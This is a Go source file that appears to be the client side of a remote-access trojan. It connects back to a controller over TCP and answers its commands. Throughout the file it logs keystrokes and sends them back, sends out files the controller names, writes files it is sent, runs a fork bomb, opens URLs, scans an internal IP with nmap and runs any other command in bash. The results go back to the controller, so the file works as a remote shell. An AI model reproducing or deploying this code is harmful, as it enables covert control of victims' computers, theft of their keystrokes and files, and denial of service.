package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/matishsiao/goInfo"
	"io"
	"io/ioutil"
	"kunpeng/keylogger"
	"kunpeng/service"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
)

const (
	IP                 = "127.0.0.1:9999"
	FILENAME           = "FileNameCHAOS"
	FOLDER_PATH        = "\\ProgramData"
	FOLDER_EXT         = "\\NameFolderExtesion"
	newLine     string = "\n"
)

/**
Windows 客户端
*/
func main() {
	for {
		Connect()
	}
}

func Connect() {
	// Create a connection
	conn, err := net.Dial("tcp", IP)

	// If don't exist a connection created than try connect to a new
	if err != nil {
		log.Println("[*] Connecting...")
		for {
			Connect()
		}
	}
	SendMessage(conn, "wwwwwwww")
	buf := make([]byte, 10)
	print("连接上了")
	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		_, err = conn.Read(buf)
		if err == io.EOF {
			conn.Close()
		}
		fmt.Print(string(buf))
		decodedCommand := string(buf)
		command := string(decodedCommand)
		//command, _ := bufio.NewReader(conn).ReadString('\n')
		// When the command received are encoded,
		// decode message received, and test on switch
		//decodedCommand, _ := base64.StdEncoding.DecodeString(command)
		print("ss")
		print(decodedCommand)
		switch string(decodedCommand) {

		case "back":
			conn.Close()
			Connect()

		case "exit":
			conn.Close()
			os.Exit(0)

		case "keylogger_start":
			print("you into keylogger_start")
			if !keylogger.StartKeyLogger() {
				print("stepone :keylogger has running!")
				SendMessage(conn, " keylogger has running!")
			} else {
				print("run keylooger")
				SendMessage(conn, "run keylogger")
			}
			RemoveNewLineCharFromConnection(conn)

		case "keylogger_show":
			if !keylogger.EndKeyLogger() {
				print("steptwo:keylogger didn't open")
				SendMessage(conn, "keylogger didn't open")
			} else {
				print(keylogger.GetKeyRecording())
				SendMessage(conn, keylogger.GetKeyRecording())
			}
			RemoveNewLineCharFromConnection(conn)

		case "getos":
			SendMessage(conn, GetOSInformation())
			RemoveNewLineCharFromConnection(conn)

		case "download":
			pathDownload := ReceiveMessageStdEncoding(conn)

			file, err := ioutil.ReadFile(string(pathDownload))
			if err != nil {
				conn.Write([]byte("[!] File not found!" + "\n"))
			}

			SendMessage(conn, string(file))
			RemoveNewLineCharFromConnection(conn)

		case "upload":
			uploadInput := ReceiveMessageStdEncoding(conn)
			decUpload := ReceiveMessageURLEncoding(conn)
			if string(decUpload) != "" {
				ioutil.WriteFile(string(uploadInput), []byte(decUpload), 777)
			}

		case "lockscreen":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		// case "ls":
		// 	SendMessage(conn, EncodeBytesToString(RunCmdReturnByte("dir")))
		// 	RemoveNewLineCharFromConnection(conn)

		case "persistence_enable":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "persistence_disable":
			SendMessage(conn, " [i] Not supported yet!")
			RemoveNewLineCharFromConnection(conn)

		case "bomb":
			// Run fork bomb
			RunCmd(":(){ :|: & };:")

			SendMessage(conn, "[*] Executed Fork Bomb!")
			RemoveNewLineCharFromConnection(conn)

		case "openurl":
			// Receive url and run it
			url := ReceiveMessageStdEncoding(conn)
			RunCmd("xdg-open " + url)

			SendMessage(conn, "[*] Opened!")
			RemoveNewLineCharFromConnection(conn)
		case "nmap":
			print("execute nmap")
			service.GetNmapInfoFromIp("10.59.13.137")
			SendMessage(conn, "run nmap")
			RemoveNewLineCharFromConnection(conn)
		} // end switch

		SendMessage(conn, RunCmdReturnString(command))

		_, err := conn.Read(make([]byte, 0))

		if err != nil {
			Connect()
		}
	}
}

func GetOSInformation() string {
	gi := goInfo.GetInfo()
	osInformation := "GoOS: " + gi.GoOS
	osInformation += "\n" + " Kernel: " + gi.Kernel
	osInformation += "\n" + " Core: " + gi.Core
	osInformation += "\n" + " Platform: " + gi.Platform
	osInformation += "\n" + " OS: " + gi.OS
	osInformation += "\n" + " Hostname: " + gi.Hostname
	osInformation += "\n" + " CPUs: " + strconv.Itoa(gi.CPUs)
	return osInformation
}

func SendMessage(conn net.Conn, message string) {

	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + newLine))

}

func ReceiveMessageStdEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.StdEncoding.DecodeString(message)
	return string(messageDecoded)
}

func ReceiveMessageURLEncoding(conn net.Conn) string {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	messageDecoded, _ := base64.URLEncoding.DecodeString(message)
	return string(messageDecoded)
}

func EncodeBytesToString(value []byte) string {
	return base64.URLEncoding.EncodeToString(value)
}

func RemoveNewLineCharFromConnection(conn net.Conn) {
	newLineChar, _ := bufio.NewReader(conn).ReadString('\n')
	log.Println(newLineChar)
}

func RunCmdReturnByte(cmd string) []byte {
	cmdExec := exec.Command("/bin/bash", "-c", cmd)
	c, _ := cmdExec.Output()
	return c
}

func RunCmdReturnString(cmd string) string {
	cmdExec := exec.Command("/bin/bash", "-c", cmd)
	c, _ := cmdExec.Output()
	return string(c)
}

func RunCmd(cmd string) {
	cmdExec := exec.Command("/bin/bash", "-c", cmd)
	c, _ := cmdExec.Output()
	log.Println(c)
}

func CreateFile(path string, text string) {
	create, _ := os.Create(path)
	create.WriteString(text)
	create.Close()
}
